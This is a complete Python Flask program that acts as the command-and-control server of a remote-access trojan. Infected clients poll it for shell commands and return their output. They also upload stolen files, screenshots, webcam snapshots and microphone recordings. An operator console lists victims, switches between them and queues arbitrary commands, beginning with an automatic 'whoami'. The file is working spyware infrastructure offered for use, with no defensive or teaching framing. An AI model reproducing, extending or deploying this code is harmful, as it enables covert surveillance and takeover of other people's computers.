from flask import Flask, request, jsonify, send_file
import threading
import os
import sys
import time
import base64
import uuid
from datetime import datetime
import shutil
import json
import getpass
import logging

# Set up logging to suppress Flask messages
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Configuration
HOST = '192.168.100.3'
PORT = 5000
DOWNLOAD_DIR = "downloads"
USE_HTTPS = False  # Changed to False to use HTTP only

# Global variables
command_queue = []
results = {}
running = True
command_lock = threading.Lock()
result_lock = threading.Lock()
result_cv = threading.Condition()
waiting_for_result = False
active_client_result = None

# Client tracking
clients = {}  # client_ip -> { 'last_seen': datetime, 'username': str, 'commands': list }
active_client = None

# ANSI color code for the $ symbol
RED = '\033[91m'
ENDC = '\033[0m'

# Ensure download directory exists
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

def set_active_client(ip):
    """Set the active client"""
    global active_client
    active_client = ip

@app.route('/command', methods=['GET'])
def get_command():
    """Endpoint for client to get next command"""
    global clients, active_client
    
    client_ip = request.remote_addr
    
    # Update the client's last_seen
    with command_lock:
        if client_ip not in clients:
            clients[client_ip] = {
                'last_seen': datetime.now(),
                'username': None,
                'commands': ['whoami']  # Add whoami command to get the username
            }
            print(f"\n[+] New client connected: {client_ip}")
        else:
            clients[client_ip]['last_seen'] = datetime.now()
            # If we don't have a username for this client, add a whoami command
            if clients[client_ip]['username'] is None and 'whoami' not in clients[client_ip]['commands']:
                clients[client_ip]['commands'].append('whoami')
    
    # If this client has commands, return the next one
    with command_lock:
        if clients[client_ip]['commands']:
            command = clients[client_ip]['commands'].pop(0)
            return jsonify({"command": command})
        else:
            return jsonify({"command": "NOOP"})

@app.route('/result', methods=['POST'])
def receive_result():
    """Endpoint for client to send command results"""
    global active_client_result, waiting_for_result
    
    client_ip = request.remote_addr
    data = request.json
    
    if not data or 'command' not in data:
        return jsonify({"error": "Invalid request"}), 400
    
    # Update client last_seen and username
    with command_lock:
        if client_ip in clients:
            clients[client_ip]['last_seen'] = datetime.now()
            
            # If the command was 'whoami', update the client's username
            if data['command'] == 'whoami' and data.get('exit_code', 0) == 0:
                username = data.get('output', '').strip()
                if username:
                    old_username = clients[client_ip]['username']
                    clients[client_ip]['username'] = username
                    if old_username is None:
                        print(f"\n[+] Client {client_ip} identified as: {username}")
    
    # Process the result
    command = data['command']
    result = {
        'command': command,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'exit_code': data.get('exit_code', 0),
        'output': data.get('output', ''),
        'error': data.get('error', '')
    }
    
    # If this client is the active client and we are waiting for a result, notify
    if client_ip == active_client and waiting_for_result:
        with result_cv:
            active_client_result = result
            waiting_for_result = False
            result_cv.notify()
    
    return jsonify({"status": "success"})

@app.route('/upload', methods=['POST'])
def upload_file():
    """Endpoint for client to upload files"""
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    
    filename = os.path.join(DOWNLOAD_DIR, file.filename)
    file.save(filename)
    
    return jsonify({"status": "success", "filename": file.filename, "size": os.path.getsize(filename)})

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    """Endpoint for client to download files"""
    try:
        file_path = os.path.join(DOWNLOAD_DIR, filename)
        return send_file(file_path, as_attachment=True)
    except FileNotFoundError:
        return jsonify({"error": "File not found"}), 404

@app.route('/screenshot', methods=['POST'])
def receive_screenshot():
    """Endpoint for client to upload screenshots"""
    if 'image' not in request.files:
        return jsonify({"error": "No image part"}), 400
    
    image = request.files['image']
    if image.filename == '':
        return jsonify({"error": "No selected image"}), 400
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"
    filepath = os.path.join(DOWNLOAD_DIR, filename)
    image.save(filepath)
    
    return jsonify({"status": "success", "filename": filename, "size": os.path.getsize(filepath)})

@app.route('/webcam', methods=['POST'])
def receive_webcam():
    """Endpoint for client to upload webcam snapshots"""
    if 'image' not in request.files:
        return jsonify({"error": "No image part"}), 400
    
    image = request.files['image']
    if image.filename == '':
        return jsonify({"error": "No selected image"}), 400
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"webcam_{timestamp}.jpg"
    filepath = os.path.join(DOWNLOAD_DIR, filename)
    image.save(filepath)
    
    return jsonify({"status": "success", "filename": filename, "size": os.path.getsize(filepath)})

@app.route('/microphone', methods=['POST'])
def receive_audio():
    """Endpoint for client to upload audio recordings"""
    if 'audio' not in request.files:
        return jsonify({"error": "No audio part"}), 400
    
    audio = request.files['audio']
    if audio.filename == '':
        return jsonify({"error": "No selected audio"}), 400
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"audio_{timestamp}.wav"
    filepath = os.path.join(DOWNLOAD_DIR, filename)
    audio.save(filepath)
    
    return jsonify({"status": "success", "filename": filename, "size": os.path.getsize(filepath)})

def print_result(result):
    """Print command result"""
    print(f"\nCommand: {result['command']}")
    print(f"Exit Code: {result['exit_code']}")
    if result['output']:
        print("Output:")
        print(result['output'])
    if result['error']:
        print("Error:")
        print(result['error'])

def list_clients():
    """List all connected clients"""
    print("\nConnected Clients:")
    with command_lock:
        for ip, info in clients.items():
            username = info.get('username', 'unknown')
            last_seen = info['last_seen'].strftime("%Y-%m-%d %H:%M:%S")
            if ip == active_client:
                print(f"  * {ip} - {username} - Last seen: {last_seen} (active)")
            else:
                print(f"    {ip} - {username} - Last seen: {last_seen}")

def switch_client(ip):
    """Switch to a different client"""
    global active_client
    with command_lock:
        if ip in clients:
            old_active = active_client
            active_client = ip
            username = clients[ip].get('username', ip)
            print(f"\n[+] Switched to client: {ip} ({username})")
            if old_active and old_active in clients:
                old_username = clients[old_active].get('username', old_active)
                print(f"[-] Deactivated client: {old_active} ({old_username})")
        else:
            print(f"\n[-] Client {ip} not found")

def print_help():
    """Print help message"""
    print("\nAvailable commands:")
    print("  list - List all connected clients")
    print("  switch <ip> - Switch to the specified client")
    print("  send <file path> - Send file to client")
    print("  pull <file path> - Pull file from client")
    print("  screenshot - Take screenshot from client")
    print("  webcam - Take webcam snapshot from client")
    print("  microphone <duration> - Record audio from client")
    print("  Any other command will be executed as a shell command")
    print("  exit - Disconnect and exit")
    print("  help - Show this help message")

def cleanup_clients():
    """Remove inactive clients and notify of disconnections"""
    global active_client
    while running:
        time.sleep(5)  # check every 5 seconds
        now = datetime.now()
        with command_lock:
            to_remove = []
            for ip, info in clients.items():
                # If client hasn't been seen in the last 30 seconds, mark as disconnected
                if (now - info['last_seen']).total_seconds() > 30:
                    to_remove.append(ip)
            
            for ip in to_remove:
                username = clients[ip].get('username', 'unknown')
                del clients[ip]
                print(f"\n[-] Client disconnected: {ip} ({username})")
                
                if active_client == ip:
                    active_client = None
                    print(f"[-] Active client disconnected")

def command_interface():
    """Command interface for user interaction"""
    global running, waiting_for_result, active_client_result
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_clients)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    while running:
        try:
            # Build the prompt with colored $
            with command_lock:
                if active_client and active_client in clients:
                    username = clients[active_client].get('username', active_client)
                    prompt = f"{username}{RED}${ENDC} "
                else:
                    prompt = f"no_active_client{RED}${ENDC} "
            
            command = input(prompt)
            
            # Handle server commands
            if command.lower() == 'exit':
                running = False
                break
            elif command.lower() == 'list':
                list_clients()
                continue
            elif command.lower().startswith('switch '):
                ip = command[7:].strip()
                switch_client(ip)
                continue
            elif command.lower() == 'help':
                print_help()
                continue
            elif command.startswith('send '):
                filepath = command[5:]
                if os.path.exists(filepath):
                    filename = os.path.basename(filepath)
                    shutil.copy(filepath, os.path.join(DOWNLOAD_DIR, filename))
                    with command_lock:
                        if active_client and active_client in clients:
                            clients[active_client]['commands'].append(f"pull {filename}")
                            print(f"\n[+] File prepared for download: {filename}")
                        else:
                            print(f"\n[-] No active client")
                else:
                    print(f"\n[-] File not found: {filepath}")
                continue
            
            # If no active client, error
            with command_lock:
                if active_client is None or active_client not in clients:
                    print(f"\n[-] No active client. Use 'switch <ip>' to set one.")
                    continue
            
            # Add the command to the active client's command list
            with command_lock:
                clients[active_client]['commands'].append(command)
            
            # Wait for the result
            with result_cv:
                waiting_for_result = True
                active_client_result = None
                result_cv.wait(timeout=30)
                
                if waiting_for_result:  # timeout
                    print("\n[-] Timeout waiting for result")
                else:
                    # Print the result
                    print_result(active_client_result)
                    
        except KeyboardInterrupt:
            running = False
            break
        except Exception as e:
            print(f"\nError: {e}")

def run_server():
    """Run the Flask server"""
    app.run(host=HOST, port=PORT, threaded=True)

if __name__ == "__main__":
    # Start command interface in a separate thread
    command_thread = threading.Thread(target=command_interface)
    command_thread.daemon = True
    command_thread.start()
    
    # Start the Flask server
    print(f"Server running on {HOST}:{PORT}")
    try:
        run_server()
    except KeyboardInterrupt:
        running = False
        print("\nServer stopped")